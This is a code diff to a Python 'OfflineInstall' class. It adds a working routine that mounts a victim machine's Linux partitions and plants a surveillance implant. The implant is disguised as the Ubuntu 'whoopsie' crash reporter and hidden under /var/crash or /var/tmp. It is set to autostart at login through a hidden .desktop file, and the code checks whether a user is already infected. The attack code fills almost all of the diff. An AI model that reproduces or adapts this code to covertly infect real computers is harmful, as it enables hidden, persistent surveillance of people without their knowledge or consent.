@@ -1020,7 +1020,7 @@ class OfflineInstall(object):
 			backdoor_core_path2 = backdoor_path2 + "/whoopsie-report"
 			backdoor_conf_path2 = backdoor_path2 + "/.cache"
 			
-			backdoor_start_path = i['home'] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
+			backdoor_start_path = "/mnt" + i['home'] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 
 			print("      -> " + backdoor_path1)
 			print("      -> " + backdoor_core_path1)
@@ -1425,6 +1425,7 @@ class OfflineInstall(object):
 			os.chmod(tmp_path2, 0o755)
 
 			print("    Copyring backdoor file [OK] -> " + tmp_path + " -> " + tmp_path2)
+
 		try:
 			ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
 		except:
@@ -1472,9 +1473,323 @@ class OfflineInstall(object):
 	def install_linux_backdoor(self, user):
 		print("    Try to install the backdoor for " + user + " on Linux system...")
 
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tablin['rootfs'], self.tablin['rootdisk']), shell=True)
+		except:
+			print("      Install [ERROR] -> " + user + " on Linux system!")
+			return False
+
+		if self.tablin['homedisk'] != None:
+			try:
+				os.mkdir("/mnt2/")
+				print("    Create new mnt mount directory [OK] -> /mnt2/")
+			except:
+				print("    Create new mnt mount directory [ERROR] -> /mnt2/")
+				pass
+
+			try:
+				ret = subprocess.check_output("mount -t {} /dev/{} /mnt2/ 2> /dev/null".format(self.tablin['homefs'], self.tablin['homedisk']), shell=True)
+			except:
+				try:
+					shutil.rmtree("/mnt2/")
+					print("    Remove mnt mount directory [OK] -> /mnt2/")
+				except:
+					print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+					pass
+
+				try:
+					ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+				except:
+					pass
+
+				print("      Install [ERROR] -> " + user + " on Linux system!")
+				return False
+
+		if self.tablin['vardisk'] != None:
+			try:
+				os.mkdir("/mnt3/")
+				print("    Create new mnt mount directory [OK] -> /mnt3/")
+			except:
+				print("    Create new mnt mount directory [ERROR] -> /mnt3/")
+				pass
+
+			try:
+				ret = subprocess.check_output("mount -t {} /dev/{} /mnt3/ 2> /dev/null".format(self.tablin['varfs'], self.tablin['vardisk']), shell=True)
+			except:
+				try:
+					shutil.rmtree("/mnt3/")
+					print("    Remove mnt mount directory [OK] -> /mnt3/")
+				except:
+					print("    Remove mnt mount directory [ERROR] -> /mnt3/")
+					pass
+
+				if self.tablin['homedisk'] != None:
+					try:
+						ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
+					except:
+						pass
+
+					try:
+						shutil.rmtree("/mnt2/")
+						print("    Remove mnt mount directory [OK] -> /mnt2/")
+					except:
+						print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+						pass
+
+				try:
+					ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+				except:
+					pass
+
+				print("      Install [ERROR] -> " + user + " on Linux system!")
+				return False
+
+		home = None
+		uid = None
+		gid = None
+
+		for i in self.uselin:
+			if i['username'] == user:
+				if i['status'] == True or i['status'] == False:
+					if self.tablin['vardisk'] != None:
+						try:
+							ret = subprocess.check_output("umount /mnt3/ 2> /dev/null", shell=True)
+						except:
+							pass
+
+						try:
+							shutil.rmtree("/mnt3/")
+							print("    Remove mnt mount directory [OK] -> /mnt3/")
+						except:
+							print("    Remove mnt mount directory [ERROR] -> /mnt3/")
+							pass
+
+					if self.tablin['homedisk'] != None:
+						try:
+							ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
+						except:
+							pass
+
+						try:
+							shutil.rmtree("/mnt2/")
+							print("    Remove mnt mount directory [OK] -> /mnt2/")
+						except:
+							print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+							pass
+
+					try:
+						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+					except:
+						pass
+
+					print("      Install [ERROR] -> " + user + " IS ALREADY INFECTED on Linux system!")
+					return False
+
+				home = i['home']
+				uid = i['uid']
+				gid = i['gid']
+				break
+
 		#
-		# TODO: infettare l'user
+		# Directory dove vengono droppati i file per l'installazione
 		##
+		the_backdoor_path = ""
+		the_launch_path = ""
+
+		if self.tablin['vardisk'] != None:
+			if os.path.exists("/mnt3/var/crash/") == True:
+				the_backdoor_path = "/mnt3/var/crash/"
+			else:
+				the_backdoor_path = "/mnt3/var/tmp/"
+		else:
+			if os.path.exists("/mnt/var/crash/") == True:
+				the_backdoor_path = "/mnt/var/crash/"
+			else:
+				the_backdoor_path = "/mnt/var/tmp/"
+
+		the_backdoor_path += ".reports-" + str(uid) + "-" + self.backconf['hdir']
+		the_backdoor_run = the_backdoor_path + "/whoopsie-report"
+		the_backdoor_exec = ""
+
+		if the_backdoor_path.find("/mnt3/") != -1:
+			the_backdoor_exec = the_backdoor_run[5:]
+		else:
+			the_backdoor_exec = the_backdoor_run[4:]
+
+		the_backdoor_config = the_backdoor_path + "/.cache"
+
+		if self.tablin['homedisk'] != None:
+			the_launch_path = "/mnt2"
+		else:		
+			the_launch_path = "/mnt"
+
+		the_launch_path += home + "/.config/autostart"
+		current_backdoor_name = ".whoopsie-" + self.backconf['hdir'] + ".desktop"
+		desktop_content = "[Desktop Entry]\n" \
+				  "Type=Application\n" \
+				  "Exec=" + the_backdoor_exec + "\n" \
+				  "NoDisplay=true\n" \
+				  "Name=whoopsie\n" \
+				  "Comment=Whoopsie Report Manager"
+		desktop_path = the_launch_path + "/" + current_backdoor_name
+
+		#
+		# Crea la directory
+		##
+		try:
+			os.makedirs(the_backdoor_path)
+			print("    Create backdoor directory [OK] -> " + the_backdoor_path)
+		except:
+			print("    Create backdoor directory [ERROR] -> " + the_backdoor_path)
+			pass
+
+		os.chown(the_backdoor_path, int(uid), int(gid))
+		os.chmod(the_backdoor_path, 0o755)
+
+
+		#
+		# Senza un primo login, la directory ~/.config/autostart non esiste, bisogna crearla
+		##
+		if os.path.exists(the_launch_path) == False:
+			try:
+				os.makedirs(the_launch_path)
+				print("    Create ~/.config/autostart directory [OK] -> " + the_launch_path)
+			except:
+				print("    Create ~/.config/autostart directory [ERROR] -> " + the_launch_path)
+				pass
+
+		os.chown(the_launch_path, int(uid), int(gid))
+		os.chmod(the_launch_path, 0o755)
+
+		#
+		# Crea .desktop per il primo avvio
+		##
+		hfile = open(desktop_path, "w")
+		hfile.write(desktop_content)
+		hfile.close()
+
+		os.chown(desktop_path, int(uid), int(gid))
+		os.chmod(desktop_path, 0o644)
+
+		print("    Create .desktop for first boot [OK] -> " + desktop_path)
+
+		try:
+			os.mkdir("/mnt4/")
+			print("    Create new mnt mount directory [OK] -> /mnt4/")
+		except:
+			print("    Create new mnt mount directory [ERROR] -> /mnt4/")
+			pass
+
+		print("    Searching backdoor configuration files in the device -> " + self.backconf['dev'] + "...")
+
+		try:
+			ret = subprocess.check_output("mount -t {} {} /mnt4/ 2> /dev/null".format(self.backconf['devfs'], self.backconf['dev']), shell=True)
+		except:
+			if self.tablin['vardisk'] != None:
+				try:
+					ret = subprocess.check_output("umount /mnt3/ 2> /dev/null", shell=True)
+				except:
+					pass
+
+				try:
+					shutil.rmtree("/mnt3/")
+					print("    Remove mnt mount directory [OK] -> /mnt3/")
+				except:
+					print("    Remove mnt mount directory [ERROR] -> /mnt3/")
+					pass
+
+			if self.tablin['homedisk'] != None:
+				try:
+					ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
+				except:
+					pass
+
+				try:
+					shutil.rmtree("/mnt2/")
+					print("    Remove mnt mount directory [OK] -> /mnt2/")
+				except:
+					print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+					pass
+
+			try:
+				ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+			except:
+				pass
+
+			try:
+				shutil.rmtree("/mnt4/")
+				print("    Remove mnt mount directory [OK] -> /mnt4/")
+			except:
+				print("    Remove mnt mount directory [ERROR] -> /mnt4/")
+				pass
+
+			print("      Install [ERROR] -> " + user + " on Linux system!")
+			return False
+	
+		#
+		# Copia i file nella directory
+		##
+		files_path = "/mnt4/RCSPE/files/LINUX/"
+		core_path = files_path
+		config_path = files_path + "config"
+
+		if self.tablin['osarch'] == "32":
+			core_path += "core32"
+		else:
+			core_path += "core64"
+
+		shutil.copyfile(core_path, the_backdoor_run)
+		os.chown(the_backdoor_run, int(uid), int(gid))
+		os.chmod(the_backdoor_run, 0o755)
+		print("    Copyring backdoor file [OK] -> " + core_path + " -> " + the_backdoor_run)
+		
+		shutil.copyfile(config_path, the_backdoor_config)
+		os.chown(the_backdoor_config, int(uid), int(gid))
+		os.chmod(the_backdoor_config, 0o755)
+		print("    Copyring backdoor config file [OK] -> " + config_path + " -> " + the_backdoor_config)
+
+		try:
+			ret = subprocess.check_output("umount /mnt4/ 2> /dev/null", shell=True)
+		except:
+			pass
+
+		try:
+			shutil.rmtree("/mnt4/")
+			print("    Remove mnt mount directory [OK] -> /mnt4/")
+		except:
+			print("    Remove mnt mount directory [ERROR] -> /mnt4/")
+			pass
+
+		if self.tablin['vardisk'] != None:
+			try:
+				ret = subprocess.check_output("umount /mnt3/ 2> /dev/null", shell=True)
+			except:
+				pass
+
+			try:
+				shutil.rmtree("/mnt3/")
+				print("    Remove mnt mount directory [OK] -> /mnt3/")
+			except:
+				print("    Remove mnt mount directory [ERROR] -> /mnt3/")
+				pass
+
+		if self.tablin['homedisk'] != None:
+			try:
+				ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
+			except:
+				pass
+
+			try:
+				shutil.rmtree("/mnt2/")
+				print("    Remove mnt mount directory [OK] -> /mnt2/")
+			except:
+				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+				pass
+
+		try:
+			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+		except:
+			pass
 
 		print("      Install [OK] -> " + user + " on Linux system!")
 		return True
